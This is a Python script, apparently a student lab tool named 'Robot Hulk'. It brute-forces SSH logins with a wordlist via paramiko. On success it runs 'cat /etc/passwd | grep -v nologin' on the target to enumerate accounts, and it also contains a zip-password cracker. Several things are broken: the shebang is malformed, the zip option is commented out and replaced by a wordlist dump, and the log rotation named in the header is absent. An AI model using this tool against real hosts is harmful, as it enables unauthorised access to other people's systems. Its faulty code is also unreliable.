#!/bin/bash/env python3

# Author:                       Marcus Nogueira
# Date of latest revision:      02/12/2024
#
#
# REQUIREMENTS:
# Add log rotation to previous script
# Add different levels of logging.
#
# NOTES:
# I'll be removing the functions that were there for educational purposes and likely will not have real use
#   - Printing out a wordlist
#   - Searching a wordlist for a word.
#   - Password Complexity test.
#        - This has use but not in this script.

import logging
from datetime import datetime
from time import sleep
from zipfile import ZipFile
import os
import sys
import paramiko

# Configure logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s',
                    datefmt='%Y-%m-%d %H:%M:%S',
                    handlers=[
                        logging.FileHandler('robot_hulk_log.txt'),
                        logging.StreamHandler(sys.stdout)
                    ])


def menu():
    while True:
        print("\n-------------------------------------")
        print("|               Robot Hulk           |")
        print("--------------------------------------")
        print("| 1. SSH vs Dictionary               |")
        print("| 2. Brute a Zip                     |")
        print("| Q. Quit                            |")
        print("--------------------------------------")
        choice = input(" Enter menu option: ")
        if choice in ["1", "2", "3", "4", "5"]:
            print()
            return choice
        elif choice.lower() == "q":
            exit()
        else:
            print("Invalid choice. Please choose another option.")
            sleep(.5)


def file_path_input(target):
    while True:
        file_path = input(f'Enter file path to {target}: ')
        if os.path.exists(file_path):
            return file_path
        logging.error("File path does not exist: %s", file_path)
        print("Please enter a valid file path.")


def load_wordlist():
    file_path = file_path_input("word list")
    file_name = os.path.basename(file_path)
    password_list = []
    print(f"\nLOADING {file_name}\n")
    try:
        with open(file_path, 'r') as file:
            for line in file:
                password_list.append(line.strip())
        logging.info('%s loaded with %d entries.', os.path.basename(file_path), len(password_list))

    except Exception as e:
        logging.error("Error loading wordlist: %s", e)
        exit()
    return password_list


def password_search():
    word = input("Enter word: ")
    file_path = file_path_input("word list")
    file_name = os.path.basename(file_path)
    password_list = []
    print(f'\nSEARCHING {file_name} for "{word}"')
    with open(file_path, 'r') as file:
        for line in file:
            password_list.append(line.strip())

    if word in password_list:
        print(f'"{word}" found.')
    else:
        print(f'"{word}" not found.')


def ssh_attack():
    ip = input("Enter IPv4 [Default: 192.168.1.18]: ") or "192.168.1.18"
    print(f'Target: {ip}')
    username = input("\nEnter username [Default: anakin]: ") or "anakin"
    print(f'Username: {username}\n')
    word_list = load_wordlist()

    print("BEGINNING RUN")
    for password in word_list:
        res = ssh_attempt(ip, username, password)

        if res == 0:
            print(f'\n[*] User: {username} - Password Found: {password} ')
            exit()
        elif res == 1:
            print(f'[*] User: {username} - Password: {password} - INVALID')


def ssh_attempt(ip, username, password):
    code = 0

    ssh = paramiko.SSHClient()  # Initializes paramike's SSH client.

    # Automatically adds host to ssh key policy, skipping the usual prompt when connecting to a new ssh host
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, 22, username, password)

        stdin, stdout, stderr = ssh.exec_command(
            "cat /etc/passwd | grep -v 'nologin'")
        sleep(.5)
        output = stdout.read()
        decoded_output = output.decode('utf-8')
        print(f'\n{decoded_output}')
    except paramiko.AuthenticationException:
        code = 1

    ssh.close()
    return code


def brute_zip():
    word_list = load_wordlist()
    target_zip = file_path_input("zip file")
    extract_path = input("Enter directory to extract to: ")

    print("\nAttempting to Extract ")
    for password in word_list:
        with ZipFile(target_zip) as zf:
            try:
                zf.extractall(path=extract_path, pwd=bytes(password, 'utf-8'))
                print(f'\n[*] Success! Extracted with password: {password}')
                exit()
            except RuntimeError:
                print(f'[*] Password: {password} - INVALID')


if __name__ == "__main__":
    menu_choice = menu()
    match menu_choice:
        case "1": ssh_attack()
        # case "2": brute_zip()
        case "2": testlist = load_wordlist()

    print(testlist)
